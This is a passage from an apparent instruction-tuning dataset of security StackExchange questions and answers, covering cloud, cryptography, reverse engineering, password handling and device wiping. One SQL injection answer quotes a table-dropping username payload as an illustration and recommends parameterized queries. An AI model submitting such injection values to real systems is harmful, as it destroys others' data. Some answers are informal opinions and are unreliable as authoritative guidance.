      "question": "How exactly should I interpret the term \"Hybrid Cloud\"?\nThe CISSP CBK definition says that a hybrid could is a mix of public and private.\nBut what exactly does it mean?\n\nIs it more a conceptual idea:If you use both a public and a private your company is a hybrid user\n\nor\n\nYou have a single cloud with different logical access and permissions for public usage and private (within the company)\n\nor\nSomething else?",
      "answer": "Look at it from a service perspective instead of from a \"cloud\" perspective (there is no such thing as a \"cloud\").\nIf a service resides partially on a privately held network as well as on a publicly held network, then it's a \"hybrid\". \nFor example, I use a security service where I deploy multiple servers within my own network (private \"cloud\") and the data from those collectors is sent to the vendor's network (public \"cloud\") for processing and correlation. That's a \"hybrid cloud\"."
    }
  },
  {
    "instruction": "Answer the question below.\nIs open source a good option for cryptography libraries?\nI am trying to find good cryptography library to use with my project. I found open source options like openSSL and many more and also proprietory options like Intel Integrated Performance Primitives cryptography library. Is there any reason why I would chose open source vs closed in case of cryptography?. I see similar posts which suggest that open source is better for cryptography for reasons that more eyes can test the code and make it robust. But how about malicious code that might get in (ex: heartbleed). Is there a tradeoff?",
    "context": "",
    "output": "The Key principle behind open source software is peer review. The idea is that many people (experts and amateurs alike) will review the code over time and that review process will lead to better, bug free code. So IMO yes, open sourced crypto algorithms are better than closed sourced algorithms for just this fact. However, both systems are still vulnerable to Zero-days and the like although with open sourced algorithms you are potentially less vulnerable due to the amount of peer review.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Is open source a good option for cryptography libraries?\nI am trying to find good cryptography library to use with my project. I found open source options like openSSL and many more and also proprietory options like Intel Integrated Performance Primitives cryptography library. Is there any reason why I would chose open source vs closed in case of cryptography?. I see similar posts which suggest that open source is better for cryptography for reasons that more eyes can test the code and make it robust. But how about malicious code that might get in (ex: heartbleed). Is there a tradeoff?",
      "answer": "The Key principle behind open source software is peer review. The idea is that many people (experts and amateurs alike) will review the code over time and that review process will lead to better, bug free code. So IMO yes, open sourced crypto algorithms are better than closed sourced algorithms for just this fact. However, both systems are still vulnerable to Zero-days and the like although with open sourced algorithms you are potentially less vulnerable due to the amount of peer review."
    }
  },
  {
    "instruction": "What is the answer to this question - What is meant by IPSec is \"transparent\"\nWhile reading a guide on IPSec, i came across this sentence:\n\nIPSec is transparent to the user and the applications.\n\nCan someone please tell me what is meant by being transparent from security view point?\n\n",
    "context": "",
    "output": "Nothing. Transparent means it does not change anything for the user and application, so you don't have to rewrite your apps to use it, unlike TLS. You don't have to copy certificates and keys around etc. It is basically an ease of use thing. You just enable it and it works.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "What is meant by IPSec is \"transparent\"\nWhile reading a guide on IPSec, i came across this sentence:\n\nIPSec is transparent to the user and the applications.\n\nCan someone please tell me what is meant by being transparent from security view point?",
      "answer": "Nothing. Transparent means it does not change anything for the user and application, so you don't have to rewrite your apps to use it, unlike TLS. You don't have to copy certificates and keys around etc. It is basically an ease of use thing. You just enable it and it works."
    }
  },
  {
    "instruction": "Can you tell me the answer to: How to print the value for every member of a custom struct in IDA Pro? (In Decompiler mode the members go off screen)\nIn IDA Pro, when you create a custom struct, apply it to a local variable, and try to check every member of it in the decompiler mode, when you hover your mouse on the variable, it only prints limited number of values of struct members based on the screen size, so the rest of them go out of screen:\n\nHow can I view the value of every member of the struct then? When I hover to field_38 for example, it just prints its offset and doesn't tell me its value.\nUsing IDA Pro 7.6.",
    "context": "",
    "output": "answer: Use Locals View in Debugger\u21feDebugger Windows\u21feLocals window.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "How to print the value for every member of a custom struct in IDA Pro? (In Decompiler mode the members go off screen)\nIn IDA Pro, when you create a custom struct, apply it to a local variable, and try to check every member of it in the decompiler mode, when you hover your mouse on the variable, it only prints limited number of values of struct members based on the screen size, so the rest of them go out of screen:\n\nHow can I view the value of every member of the struct then? When I hover to field_38 for example, it just prints its offset and doesn't tell me its value.\nUsing IDA Pro 7.6.",
      "answer": "Use Locals View in Debugger\u21feDebugger Windows\u21feLocals window."
    }
  },
  {
    "instruction": "Answer this question:\n\nWhich websites support U2F?\nFIDO Alliance's Universal 2nd Factor (U2F) is a new and promising approach to replace passwords. The FIDO Alliance comprises of many players but so far only Google website seems to support it. Are there other websites I can use to login with my U2F token?",
    "context": "",
    "output": "A: Here www.dongleauth.info is list of websites,\nself-hosted software and USB dongles compatible to U2F (as well as One\nTime Passwords)",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Which websites support U2F?\nFIDO Alliance's Universal 2nd Factor (U2F) is a new and promising approach to replace passwords. The FIDO Alliance comprises of many players but so far only Google website seems to support it. Are there other websites I can use to login with my U2F token?",
      "answer": "Here www.dongleauth.info is list of websites,\nself-hosted software and USB dongles compatible to U2F (as well as One\nTime Passwords)"
    }
  },
  {
    "instruction": "Q: How secure is pgAdmin to save database password?\nWhen we are creating a new connection with pgAdmin, we are presented with an option to save the password into our computer, so we won't have to retype it every time we want to connect with the database.\nI can't find in any document how this password is stored. Is it encrypted? Saved under Windows protection? Plain text?\nDoes anyone knows the security implications of saving a database password in pgAdmin?",
    "context": "",
    "output": " A: The pgAdmin maintainers adopted a suggestion of mine and now the stored passwords have a master password to encrypt them.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "How secure is pgAdmin to save database password?\nWhen we are creating a new connection with pgAdmin, we are presented with an option to save the password into our computer, so we won't have to retype it every time we want to connect with the database.\nI can't find in any document how this password is stored. Is it encrypted? Saved under Windows protection? Plain text?\nDoes anyone knows the security implications of saving a database password in pgAdmin?",
      "answer": "The pgAdmin maintainers adopted a suggestion of mine and now the stored passwords have a master password to encrypt them."
    }
  },
  {
    "instruction": "Answer the question below.\nCan anybody recommend any gems for checking security vulnerabilities?\nI want to check one of my RoR projects for security vulnerabilities.\nSo can anybody recommend any gems for my needs?",
    "context": "",
    "output": "Yes.  You want Brakeman, a tool that scans your RoR code for security vulnerabilities\nI recommend reading the OWASP Ruby on Rails Security Guide.\nYou could also try any web pen-testing tool; they are not language-specific.  There are many of them.  They only find low-hanging fruit, not all security problems, but it can't hurt to use them just in case they find anything your other methods missed.  Search on this forum to find more information, e.g.,\nWhat tools are available to assess the security of a web application?.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Can anybody recommend any gems for checking security vulnerabilities?\nI want to check one of my RoR projects for security vulnerabilities.\nSo can anybody recommend any gems for my needs?",
      "answer": "Yes.  You want Brakeman, a tool that scans your RoR code for security vulnerabilities\nI recommend reading the OWASP Ruby on Rails Security Guide.\nYou could also try any web pen-testing tool; they are not language-specific.  There are many of them.  They only find low-hanging fruit, not all security problems, but it can't hurt to use them just in case they find anything your other methods missed.  Search on this forum to find more information, e.g.,\nWhat tools are available to assess the security of a web application?."
    }
  },
  {
    "instruction": "Q: Does turning off output make aircrack-ng work faster?\nI know that preventing output on the console or in anyway makes the program run much faster. Displaying the output is a long process to complete.\nBut I wonder if using -q option in aircrack-ng, which basically skips the output, would make a significant difference? I'm doubtful because aircrack-ng doesn't display Master Key, Transient Key and EAPOL HMAC for all the keys in the dictionary.",
    "context": "",
    "output": " A: I tried aircrack-ng on a dictionary with 2,000,000 keys and none of these keys is the correct password. So aircrack-ng had to go through all of those 2,000,000 passwords. Handshake was WPA encrypted, aircrack version was \"Aircrack-ng 1.2 rc4\". I ran this test on a Core i5 4th Gen machine with 4 gigs DDR3 ram and here's the result:\nNormal Mode (With Output)   : 1281.495 seconds\nQuiet Mode (Without Output) : 1264.578 seconds\n\nThe time noted is not the system/CPU time of the process but instead it's wall clock time (i.e. all the elapsed time including time slices used by other processes).\nSo yes, preventing the output does make a difference but it's not as much as I expected. Maybe it's because aircrack-ng doesn't create output for all the keys tested.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Does turning off output make aircrack-ng work faster?\nI know that preventing output on the console or in anyway makes the program run much faster. Displaying the output is a long process to complete.\nBut I wonder if using -q option in aircrack-ng, which basically skips the output, would make a significant difference? I'm doubtful because aircrack-ng doesn't display Master Key, Transient Key and EAPOL HMAC for all the keys in the dictionary.",
      "answer": "I tried aircrack-ng on a dictionary with 2,000,000 keys and none of these keys is the correct password. So aircrack-ng had to go through all of those 2,000,000 passwords. Handshake was WPA encrypted, aircrack version was \"Aircrack-ng 1.2 rc4\". I ran this test on a Core i5 4th Gen machine with 4 gigs DDR3 ram and here's the result:\nNormal Mode (With Output)   : 1281.495 seconds\nQuiet Mode (Without Output) : 1264.578 seconds\n\nThe time noted is not the system/CPU time of the process but instead it's wall clock time (i.e. all the elapsed time including time slices used by other processes).\nSo yes, preventing the output does make a difference but it's not as much as I expected. Maybe it's because aircrack-ng doesn't create output for all the keys tested."
    }
  },
  {
    "instruction": "Question: How to identify a specific operating system with port scans?\nAccording to the implementation of the TCP/IP stack an attacker is able to identify which operating system is running on a network device. Is there any paper or the like according on this topic?",
    "context": "",
    "output": "Answer: There's also a Nessus Plugin for that. You can find more details here.\nBy the way, this technique is called OS Fingerprinting. You can find more details about it on this Wikipedia Page of course and in this SANS paper.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "How to identify a specific operating system with port scans?\nAccording to the implementation of the TCP/IP stack an attacker is able to identify which operating system is running on a network device. Is there any paper or the like according on this topic?",
      "answer": "There's also a Nessus Plugin for that. You can find more details here.\nBy the way, this technique is called OS Fingerprinting. You can find more details about it on this Wikipedia Page of course and in this SANS paper."
    }
  },
  {
    "instruction": "Question: What Are the Algorithm and techniques of IP Traceback?\nIn most of the cases the cyber attacks such as a DDoS attack or other kinds, it is sometimes hard/impossible to identify the real source IP addresses. This is because when you review the logs and lookup those IP addresses you usually find that the addresses belong to victims.\nWhen you report the crime to cyber-attack investigator agencies, how can they find real IP's or persons behind it?",
    "context": "",
    "output": "Answer: You, as an individual, can't find who's behind an IP address.\nWell, you can grab an IP address via social-engineering tricks if you suspect someone, but if you have no idea who to suspect, then you're basically out of options here.\nThe FBI is a government agency, they can just ask your Internet Service Provider because the law may allow them to do so during an investigation.\nYour ISP have your personal information, they'll communicate them to the FBI: it's that easy.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "What Are the Algorithm and techniques of IP Traceback?\nIn most of the cases the cyber attacks such as a DDoS attack or other kinds, it is sometimes hard/impossible to identify the real source IP addresses. This is because when you review the logs and lookup those IP addresses you usually find that the addresses belong to victims.\nWhen you report the crime to cyber-attack investigator agencies, how can they find real IP's or persons behind it?",
      "answer": "You, as an individual, can't find who's behind an IP address.\nWell, you can grab an IP address via social-engineering tricks if you suspect someone, but if you have no idea who to suspect, then you're basically out of options here.\nThe FBI is a government agency, they can just ask your Internet Service Provider because the law may allow them to do so during an investigation.\nYour ISP have your personal information, they'll communicate them to the FBI: it's that easy."
    }
  },
  {
    "instruction": "Answer the following question:\n\nHow can Linux service installation page create an attack surface?\nBased on one of the lectures of Planning, Auditing and Maintaining Enterprise system course  by Greg Williams (Department of computer science university of Colorado):\n\nLet's say they were installing a service on a Linux system and we forget to take down the installation page. That installation page has a lot of sensitive information on it. so, if we leave that page up and don't delete it out of the directory after installation, that's a way for an attacker to get in.\n\nHow It becomes possible?",
    "context": "",
    "output": "\"that's a way\" requires an antecedent, and it is very vague. \nThe page being up? No, that doesn't offer a way in. It's static.\nThe information on the page? If the info helps someone to craft a way in, sure, but then the information isn't the way in, it's merely a resource. \nI think this is simply a case of someone not being careful when speaking.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "How can Linux service installation page create an attack surface?\nBased on one of the lectures of Planning, Auditing and Maintaining Enterprise system course  by Greg Williams (Department of computer science university of Colorado):\n\nLet's say they were installing a service on a Linux system and we forget to take down the installation page. That installation page has a lot of sensitive information on it. so, if we leave that page up and don't delete it out of the directory after installation, that's a way for an attacker to get in.\n\nHow It becomes possible?",
      "answer": "\"that's a way\" requires an antecedent, and it is very vague. \nThe page being up? No, that doesn't offer a way in. It's static.\nThe information on the page? If the info helps someone to craft a way in, sure, but then the information isn't the way in, it's merely a resource. \nI think this is simply a case of someone not being careful when speaking."
    }
  },
  {
    "instruction": "Question: Is it possible to disable `ypcat passwd`\nWe have an old NIS setup which, at geological speed, is being replaced by a Kerberos one. In the meantime, all the (non-root) users can simply type ypcat passwd and get the hashes of all the users' passwords. Is there an interim hack one can do to mitigate this so that it is at least not trivial to get the password hashes?",
    "context": "",
    "output": "Answer: You can upgrade to NIS+, but that's sort of an epic definition of \"interim hack.\"\nNo, plain old NIS does not support any protection for the password hashes it distributes.\n(and before someone suggests removing or chmod'ing ypcat, you'd have to disable every programming language on the system as well.  Writing a ypcat clone is trivial, see Python for example.)",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Is it possible to disable `ypcat passwd`\nWe have an old NIS setup which, at geological speed, is being replaced by a Kerberos one. In the meantime, all the (non-root) users can simply type ypcat passwd and get the hashes of all the users' passwords. Is there an interim hack one can do to mitigate this so that it is at least not trivial to get the password hashes?",
      "answer": "You can upgrade to NIS+, but that's sort of an epic definition of \"interim hack.\"\nNo, plain old NIS does not support any protection for the password hashes it distributes.\n(and before someone suggests removing or chmod'ing ypcat, you'd have to disable every programming language on the system as well.  Writing a ypcat clone is trivial, see Python for example.)"
    }
  },
  {
    "instruction": "Answer the following question:\n\nSQL injection attack prevention by frequently changing table names?\nI understand the basic process of SQL injection attack. I was told that one way to prevent such an attack is by frequently changing the table name! Is that possible? If so, can someone provide me a link to read about it more because I couldn't find an explanation about it on the web.",
    "context": "",
    "output": "Changing the table name periodically will make SQL injection a bit harder (you can no longer blindly register a username of Robert'); DROP TABLE Students;-- to cause havoc).  However, there are SQL injection techniques for figuring out table names, which can bypass your defenses.\nThe correct way to prevent SQL injection is to use parameterized queries.  This completely stops injection, and is far less complicated than re-writing your queries every time you change your table names.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "SQL injection attack prevention by frequently changing table names?\nI understand the basic process of SQL injection attack. I was told that one way to prevent such an attack is by frequently changing the table name! Is that possible? If so, can someone provide me a link to read about it more because I couldn't find an explanation about it on the web.",
      "answer": "Changing the table name periodically will make SQL injection a bit harder (you can no longer blindly register a username of Robert'); DROP TABLE Students;-- to cause havoc).  However, there are SQL injection techniques for figuring out table names, which can bypass your defenses.\nThe correct way to prevent SQL injection is to use parameterized queries.  This completely stops injection, and is far less complicated than re-writing your queries every time you change your table names."
    }
  },
  {
    "instruction": "Answer the following question:\n\nHow do you create a password list for a forensics case based on the evidence\nI would like to compile a list of strings and filenames based on digital evidence obtained to make them into a password dictionary. I understand that FTK offers this solution but it's not free to use. \nIs there any tools that can help aid this process instead of manually copying each string?",
    "context": "",
    "output": "What you're looking for is Bulk Extractor. I haven't used it before, but have heard good things.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "How do you create a password list for a forensics case based on the evidence\nI would like to compile a list of strings and filenames based on digital evidence obtained to make them into a password dictionary. I understand that FTK offers this solution but it's not free to use. \nIs there any tools that can help aid this process instead of manually copying each string?",
      "answer": "What you're looking for is Bulk Extractor. I haven't used it before, but have heard good things."
    }
  },
  {
    "instruction": "Question: Android, how to protect in case of theft\nWhat are some steps to take into account to protect an Android phone in case of theft? \nSmartphones are everywhere now, before the market was dominated by Blackberry and Windows Mobile. These days more and more companies are adopting Android, Windows Phone and iPhone instead. \nPeople carry a lot of information on their phones, often confidential data that was distributed through email. \nHow can one protect from leaking this business critical data in case of theft? Meaning: remote whiping or encryption of all data on the phone so that a thief cannot access this data anymore.",
    "context": "",
    "output": "Answer: Since Ice Cream Sandwhich, Android devices support full disk encryption. This is based on dm-crypt and requires password or pin to unlock your phone. While users may find this irritating (the swipe method is not supported), it is a tradeoff you will need to consider to keep your info safe.\nApps that can whipe data or more:\n\nKaspersky Mobile Security\nTouchdown\n\nEmail clients that encrypt your email:\n\nGOOD\nVoltage Securemail",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Android, how to protect in case of theft\nWhat are some steps to take into account to protect an Android phone in case of theft? \nSmartphones are everywhere now, before the market was dominated by Blackberry and Windows Mobile. These days more and more companies are adopting Android, Windows Phone and iPhone instead. \nPeople carry a lot of information on their phones, often confidential data that was distributed through email. \nHow can one protect from leaking this business critical data in case of theft? Meaning: remote whiping or encryption of all data on the phone so that a thief cannot access this data anymore.",
      "answer": "Since Ice Cream Sandwhich, Android devices support full disk encryption. This is based on dm-crypt and requires password or pin to unlock your phone. While users may find this irritating (the swipe method is not supported), it is a tradeoff you will need to consider to keep your info safe.\nApps that can whipe data or more:\n\nKaspersky Mobile Security\nTouchdown\n\nEmail clients that encrypt your email:\n\nGOOD\nVoltage Securemail"
    }
  },
  {
    "instruction": "What is the answer to this question - Can Cron cause the site to go down or DDos attack?\nYesterday I started running a cronjob [code below] on my server\n('*/1 * * * *', 'api.cron.sync_with_elastic',['nginx-access-logs'])\n\nIn the morning I got a message that my website is down. I was unable to even SSH, I switched off the server from dashboard my cloud provider has provided and then restarted it. Below is the metric of the website in the last 24 hrs.\n\nIs this a DDoS attack or cron has caused this issue?\n\n",
    "context": "",
    "output": "Your */1 * * * * equals * * * * * i.e. running your cronjob every minute. If the task takes longer than a minute and doesn't stop the last run, you end up having multiple tasks running simultaneously. Since that takes more resources, the tasks slows down.\nThat's a vicious circle that over time can lead in exhausting all resources, which will make your server unresponsive. Despite we can't rule out DDoS, this alone can explain your situation. I'd even say it's the most plausible cause.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Can Cron cause the site to go down or DDos attack?\nYesterday I started running a cronjob [code below] on my server\n('*/1 * * * *', 'api.cron.sync_with_elastic',['nginx-access-logs'])\n\nIn the morning I got a message that my website is down. I was unable to even SSH, I switched off the server from dashboard my cloud provider has provided and then restarted it. Below is the metric of the website in the last 24 hrs.\n\nIs this a DDoS attack or cron has caused this issue?",
      "answer": "Your */1 * * * * equals * * * * * i.e. running your cronjob every minute. If the task takes longer than a minute and doesn't stop the last run, you end up having multiple tasks running simultaneously. Since that takes more resources, the tasks slows down.\nThat's a vicious circle that over time can lead in exhausting all resources, which will make your server unresponsive. Despite we can't rule out DDoS, this alone can explain your situation. I'd even say it's the most plausible cause."
    }
  },
  {
    "instruction": "Please answer this question: What to do about email threats containing leaked passwords?\nA few days ago I got an email from a hacker supposedly using an email of mine (he was using the same email address TO and FROM) from my own email domain, and had a part of a password I use to purchase items with this particular email but not the one associated with the email server at HostGator, and threatening me with bogus claims and demanding a ransom. \nI used haveibeenpwned and resulted in 7 sites (i.e. Linkedin hacks) and 1 paste. I read your sites answers and Troy's info but do not understand how to proceed. I am a small biz man and not a coder.",
    "context": "",
    "output": "This is a known scam. The scammers look up emails and cracked passwords in public leaks of site databases and then send an extortion email to people. The password is already out in the open, sorry. You should change the passwords on all sites using that password. On the up-side, this does mean that the person who is emailing you is not actually a hacker and they have not infected your computer.\nYou should use a password manager to prevent this from being an issue in the future.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "What to do about email threats containing leaked passwords?\nA few days ago I got an email from a hacker supposedly using an email of mine (he was using the same email address TO and FROM) from my own email domain, and had a part of a password I use to purchase items with this particular email but not the one associated with the email server at HostGator, and threatening me with bogus claims and demanding a ransom. \nI used haveibeenpwned and resulted in 7 sites (i.e. Linkedin hacks) and 1 paste. I read your sites answers and Troy's info but do not understand how to proceed. I am a small biz man and not a coder.",
      "answer": "This is a known scam. The scammers look up emails and cracked passwords in public leaks of site databases and then send an extortion email to people. The password is already out in the open, sorry. You should change the passwords on all sites using that password. On the up-side, this does mean that the person who is emailing you is not actually a hacker and they have not infected your computer.\nYou should use a password manager to prevent this from being an issue in the future."
    }
  },
  {
    "instruction": "Please answer this question: Is it safe to run virus (infected executable) inside VirtualBox?\nIs it safer to run suspicious (trojan, malware, virus) software/exe/applications inside VirtualBox (Windows) and what threats do they have?",
    "context": "",
    "output": "Your question differs from the one stated in your post. Is it safer? Yes, it is safer to execute programs in a virtual machine but it is not complete safe (then again, what is?). You can escape a virtual machine a vulnerability is used, in this case within VirtualBox. \nYou also have to keep in mind that setting up the virtual machine poorly will allow malicious code to escape the virtual machine. This all depends on you.\nIt depends on the malware itself what they can cause. It can vary from using your computer or virtual machine in a botnet to destroying all files on the computer.\nEdit It was brought to my attention this question is a duplicate, see this answer for a more detailed answer to your question.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Is it safe to run virus (infected executable) inside VirtualBox?\nIs it safer to run suspicious (trojan, malware, virus) software/exe/applications inside VirtualBox (Windows) and what threats do they have?",
      "answer": "Your question differs from the one stated in your post. Is it safer? Yes, it is safer to execute programs in a virtual machine but it is not complete safe (then again, what is?). You can escape a virtual machine a vulnerability is used, in this case within VirtualBox. \nYou also have to keep in mind that setting up the virtual machine poorly will allow malicious code to escape the virtual machine. This all depends on you.\nIt depends on the malware itself what they can cause. It can vary from using your computer or virtual machine in a botnet to destroying all files on the computer.\nEdit It was brought to my attention this question is a duplicate, see this answer for a more detailed answer to your question."
    }
  },
  {
    "instruction": "Question: How do you compare C source code with the corresponding binary's assembly in IDA Pro?\nI'm wondering if there's a way to compare source code to the disassembled assembly in IDA Pro? (e.g. I compile hello.c in Linux then open the binary in IDA Pro in OS X, and would like to compare the assembly with the source so make it easier to find out what's going on). Does such a feature exist?\nADDED From Comment:\nBy the way, I forgot to mention, I am in OS-X and the binary was compiled by Lunux",
    "context": "",
    "output": "Answer: You can compile your file with DWARF information in it, since IDA supports it:",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "How do you compare C source code with the corresponding binary's assembly in IDA Pro?\nI'm wondering if there's a way to compare source code to the disassembled assembly in IDA Pro? (e.g. I compile hello.c in Linux then open the binary in IDA Pro in OS X, and would like to compare the assembly with the source so make it easier to find out what's going on). Does such a feature exist?\nADDED From Comment:\nBy the way, I forgot to mention, I am in OS-X and the binary was compiled by Lunux",
      "answer": "You can compile your file with DWARF information in it, since IDA supports it:"
    }
  },
  {
    "instruction": "Can you tell me the answer to: GPG advantages / disadvantages, is it useful or secure?\nI thinking about GPG, is very widely used, but is secure? Why and where we using GPG? \nI found an article from 2002, but is very old.",
    "context": "",
    "output": "answer: GnuPG implements the OpenPGP format. Despite a few quirks due to its old age, it is reasonably secure (no serious weakness has been found yet in its usage of cryptography).\nOpenPGP was initially meant for emails. It works well for that and plugins are available for various emailing software. The sore point of secure emails (encryption and/or signatures) is about making sure that you know the correct public key for any correspondent. OpenPGP relies on the Web of Trust concept, which is neat but, in practice, does not work well (it requires a thoroughly redundant graph of cross-user certifications, that is unlikely to ever exist). If you can make sure that you have the right key (e.g. by exchanging the public key fingerprints in person or over a phone call), then OpenPGP works well (I do that with customers).\nOther usages include validation of software packages. For instance, this is integrated in the format for Debian packages and thus used in some major Linux versions (including Ubuntu).",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "GPG advantages / disadvantages, is it useful or secure?\nI thinking about GPG, is very widely used, but is secure? Why and where we using GPG? \nI found an article from 2002, but is very old.",
      "answer": "GnuPG implements the OpenPGP format. Despite a few quirks due to its old age, it is reasonably secure (no serious weakness has been found yet in its usage of cryptography).\nOpenPGP was initially meant for emails. It works well for that and plugins are available for various emailing software. The sore point of secure emails (encryption and/or signatures) is about making sure that you know the correct public key for any correspondent. OpenPGP relies on the Web of Trust concept, which is neat but, in practice, does not work well (it requires a thoroughly redundant graph of cross-user certifications, that is unlikely to ever exist). If you can make sure that you have the right key (e.g. by exchanging the public key fingerprints in person or over a phone call), then OpenPGP works well (I do that with customers).\nOther usages include validation of software packages. For instance, this is integrated in the format for Debian packages and thus used in some major Linux versions (including Ubuntu)."
    }
  },
  {
    "instruction": "Please answer this question: Draw circuit of a multilayer PCB\nI have found a multilayer PCB of which I need to draw the circuit. At first, I tried to find the circuit on the internet using part numbers, but I did not get any result. The PCB is from a very old alarm installation.\nAre there any tools or techniques I can use to get to know the structure of the layers I can't see?",
    "context": "",
    "output": "There are comprehensive tools that can do precisely this. Part of the software that comes with them allows you to place part numbers between pads and have the circuit diagram automatically generated for you. Unfortunately, they're likely to set you back a fair bit of cash.\nAn alternative is to use corrosives and sharp implements to manually split the layers, but that's difficult and prone to mistakes. If you've got a number of boards you can destroy in the process, this is probably the cheapest option.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Draw circuit of a multilayer PCB\nI have found a multilayer PCB of which I need to draw the circuit. At first, I tried to find the circuit on the internet using part numbers, but I did not get any result. The PCB is from a very old alarm installation.\nAre there any tools or techniques I can use to get to know the structure of the layers I can't see?",
      "answer": "There are comprehensive tools that can do precisely this. Part of the software that comes with them allows you to place part numbers between pads and have the circuit diagram automatically generated for you. Unfortunately, they're likely to set you back a fair bit of cash.\nAn alternative is to use corrosives and sharp implements to manually split the layers, but that's difficult and prone to mistakes. If you've got a number of boards you can destroy in the process, this is probably the cheapest option."
    }
  },
  {
    "instruction": "Is it possible to decrypt Bcrypt encryption?\nI do have password that has been encrypted with Bcrypt and the salt . Is it possible if I want to decrypt the password into normal text ?",
    "context": "",
    "output": "bcrypt is not an encryption function, it's a password hashing function, relying on Blowfish's key scheduling, not its encryption. Hashing are mathematical one-way functions, meaning there is no* way to reverse the output string to get the input string.\n*of course only Siths deal in absolutes and there are a few attacks against hashes. But none of them are \"reversing\" the hashing, AFAIK.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Is it possible to decrypt Bcrypt encryption?\nI do have password that has been encrypted with Bcrypt and the salt . Is it possible if I want to decrypt the password into normal text ?",
      "answer": "bcrypt is not an encryption function, it's a password hashing function, relying on Blowfish's key scheduling, not its encryption. Hashing are mathematical one-way functions, meaning there is no* way to reverse the output string to get the input string.\n*of course only Siths deal in absolutes and there are a few attacks against hashes. But none of them are \"reversing\" the hashing, AFAIK."
    }
  },
  {
    "instruction": "Answer this question:\n\nSSD erasure strategy for a secondhand laptop\nI recently purchased a secondhand MacBook Air for work purposes; the laptop was shipped to me with a fresh install of OS X. I do not know the prior owner or what they used the laptop for, and thus I need to verify that all software and data on the solid state drive is both erased and irrecoverable before setting up a fresh OS X install.\nI plan to do the following:\nEncrypt the drive currently holding the placeholder OS X system using Filevault 2 and a strong password.\nReboot to an OS X install thumb drive, and erase the hard drive using Disk Utility. I assume this will securely erasing the FileVault key, thus rendering the old data impossible to decrypt.\nReinstall Mac OS X over the old (erased) encrypted volume, and set up FileVault 2 to encrypt this new install.\nIs this sufficient to ensure that no relic software or hard drive data from the old drive owner is recoverable?",
    "context": "",
    "output": "A: Encryption makes no sense in this context. Writing an encrypted version of the data to the media will make it strictly easier to recover the data than simply writing random data.\nHowever since you are asking about an SSD there is an even better option. Use a tool to issue a TRIM command (or a sequence of commands) to the drive instructing it to delete all data. This is the fastest way to wipe an SSD and makes it very difficult if not impossible to recover any of the data. It should also give you better performance of the clean install you are going to perform after wiping the SSD.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "SSD erasure strategy for a secondhand laptop\nI recently purchased a secondhand MacBook Air for work purposes; the laptop was shipped to me with a fresh install of OS X. I do not know the prior owner or what they used the laptop for, and thus I need to verify that all software and data on the solid state drive is both erased and irrecoverable before setting up a fresh OS X install.\nI plan to do the following:\nEncrypt the drive currently holding the placeholder OS X system using Filevault 2 and a strong password.\nReboot to an OS X install thumb drive, and erase the hard drive using Disk Utility. I assume this will securely erasing the FileVault key, thus rendering the old data impossible to decrypt.\nReinstall Mac OS X over the old (erased) encrypted volume, and set up FileVault 2 to encrypt this new install.\nIs this sufficient to ensure that no relic software or hard drive data from the old drive owner is recoverable?",
      "answer": "Encryption makes no sense in this context. Writing an encrypted version of the data to the media will make it strictly easier to recover the data than simply writing random data.\nHowever since you are asking about an SSD there is an even better option. Use a tool to issue a TRIM command (or a sequence of commands) to the drive instructing it to delete all data. This is the fastest way to wipe an SSD and makes it very difficult if not impossible to recover any of the data. It should also give you better performance of the clean install you are going to perform after wiping the SSD."
    }
  },
  {
    "instruction": "Please answer this question: NASM, MASM, Intel, AT&T' syntax?\nI see  word NASM, MASM, Intel, AT&T. I am confused between them. Is it different types of assembly?",
    "context": "",
    "output": "You are confusing several things.\nnasm, masm and gas (GNU Assembler) are tools that compile an x86 assembly text file into an executable. Each of them do have a specific syntax to specify  your program. But, they share a lot on assembly instructions.\nThen, Intel and AT&T are specific syntax to write x86 assembly programs. In fact, nasm and masm use the Intel syntax, where gas is using the AT&T syntax.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "NASM, MASM, Intel, AT&T' syntax?\nI see  word NASM, MASM, Intel, AT&T. I am confused between them. Is it different types of assembly?",
      "answer": "You are confusing several things.\nnasm, masm and gas (GNU Assembler) are tools that compile an x86 assembly text file into an executable. Each of them do have a specific syntax to specify  your program. But, they share a lot on assembly instructions.\nThen, Intel and AT&T are specific syntax to write x86 assembly programs. In fact, nasm and masm use the Intel syntax, where gas is using the AT&T syntax."
    }
  },
  {
